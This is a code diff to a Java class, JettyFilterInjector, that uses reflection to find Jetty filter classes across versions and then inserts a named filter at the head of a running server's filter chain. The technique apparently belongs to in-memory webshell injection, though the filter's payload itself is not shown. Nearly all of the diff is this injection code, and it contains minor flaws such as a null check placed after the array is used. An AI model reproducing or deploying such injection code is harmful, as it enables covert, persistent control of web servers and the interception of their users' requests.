@@ -5,9 +5,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.PrintStream;
 import java.lang.reflect.*;
-import java.util.ArrayList;
 import java.util.HashSet;
-import java.util.List;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
@@ -86,68 +84,53 @@ public class JettyFilterInjector {
             return;
         }
 
-        String[] classNames = new String[]{
-                "org.eclipse.jetty.servlet.FilterHolder",
-                "org.eclipse.jetty.ee8.servlet.FilterHolder",
-                "org.eclipse.jetty.ee9.servlet.FilterHolder",
-                "org.eclipse.jetty.ee10.servlet.FilterHolder",
-                "org.eclipse.jetty.ee11.servlet.FilterHolder",
-                "org.mortbay.jetty.servlet.FilterHolder",
+        String[][] filterHolderClassNames = new String[][]{
+                new String[]{"org.eclipse.jetty.servlet.FilterHolder", "org.eclipse.jetty.servlet.FilterMapping"},
+                new String[]{"org.mortbay.jetty.servlet.FilterHolder", "org.mortbay.jetty.servlet.FilterMapping"},
+                new String[]{"org.eclipse.jetty.ee8.servlet.FilterHolder", "org.eclipse.jetty.ee8.servlet.FilterMapping"},
+                new String[]{"org.eclipse.jetty.ee9.servlet.FilterHolder", "org.eclipse.jetty.ee9.servlet.FilterMapping"},
+                new String[]{"org.eclipse.jetty.ee10.servlet.FilterHolder", "org.eclipse.jetty.ee10.servlet.FilterMapping"},
+                new String[]{"org.eclipse.jetty.ee11.servlet.FilterHolder", "org.eclipse.jetty.ee11.servlet.FilterMapping"},
         };
 
         Class<?> filterHolderClass = null;
+        Class<?> filterMappingClass = null;
 
-        for (String className : classNames) {
+        for (String[] classNames : filterHolderClassNames) {
             try {
-                filterHolderClass = context.getClass().getClassLoader().loadClass(className);
+                filterHolderClass = context.getClass().getClassLoader().loadClass(classNames[0]);
+                filterMappingClass = context.getClass().getClassLoader().loadClass(classNames[1]);
             } catch (ClassNotFoundException ignored) {
             }
         }
 
-        if (filterHolderClass == null) {
-            throw new ClassNotFoundException("FilterHodler");
+        if (filterHolderClass == null || filterMappingClass == null) {
+            throw new ClassNotFoundException("FilterHodler or FilterMapping not found");
         }
 
         Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);
         Object filterHolder = constructor.newInstance(filter.getClass());
         invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
-        invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, int.class}, new Object[]{filterHolder, getUrlPattern(), 1});
-        moveFilterToFirst(servletHandler);
-        invokeMethod(servletHandler, "invalidateChainsCache");
-    }
 
-    private void moveFilterToFirst(Object servletHandler) throws Exception {
-        Object filterMaps = getFieldValue(servletHandler, "_filterMappings");
-        ArrayList<Object> reorderedFilters = new ArrayList<Object>();
-        int filterLength;
+        invokeMethod(servletHandler, "addFilter", new Class[]{filterHolderClass}, new Object[]{filterHolder});
 
-        if (filterMaps.getClass().isArray()) {
-            filterLength = Array.getLength(filterMaps);
-            for (int i = 0; i < filterLength; i++) {
-                Object filter = Array.get(filterMaps, i);
-                String filterName = (String) getFieldValue(filter, "_filterName");
-                if (filterName.equals(getClassName())) {
-                    reorderedFilters.add(0, filter);
-                } else {
-                    reorderedFilters.add(filter);
-                }
-            }
-            for (int i = 0; i < filterLength; i++) {
-                Array.set(filterMaps, i, reorderedFilters.get(i));
-            }
-        } else if (filterMaps instanceof ArrayList) {
-            ArrayList<Object> filterList = (ArrayList<Object>) filterMaps;
-            for (Object filter : filterList) {
-                String filterName = (String) getFieldValue(filter, "_filterName");
-                if (filterName.equals(getClassName())) {
-                    reorderedFilters.add(0, filter);
-                } else {
-                    reorderedFilters.add(filter);
-                }
-            }
-            filterList.clear();
-            filterList.addAll(reorderedFilters);
+        Object filterMapping = filterMappingClass.getConstructor().newInstance();
+        invokeMethod(filterMapping, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
+        invokeMethod(filterMapping, "setPathSpec", new Class[]{String.class}, new Object[]{getUrlPattern()});
+        invokeMethod(filterMapping, "setDispatches", new Class[]{int.class}, new Object[]{1});
+
+        Object[] mappings = (Object[]) invokeMethod(servletHandler, "getFilterMappings");
+        Object[] newMappings = null;
+        int length = Array.getLength(mappings);
+        if (mappings == null || length == 0) {
+            newMappings = (Object[]) Array.newInstance(filterMappingClass, 1);
+        } else {
+            newMappings = (Object[]) Array.newInstance(filterMappingClass, length + 1);
+            System.arraycopy(mappings, 0, newMappings, 1, length);
         }
+        newMappings[0] = filterMapping;
+        invokeMethod(servletHandler, "setFilterMappings", new Class[]{Array.newInstance(filterMappingClass, 0).getClass()}, new Object[]{newMappings});
+        invokeMethod(servletHandler, "invalidateChainsCache");
     }
 
     @Override
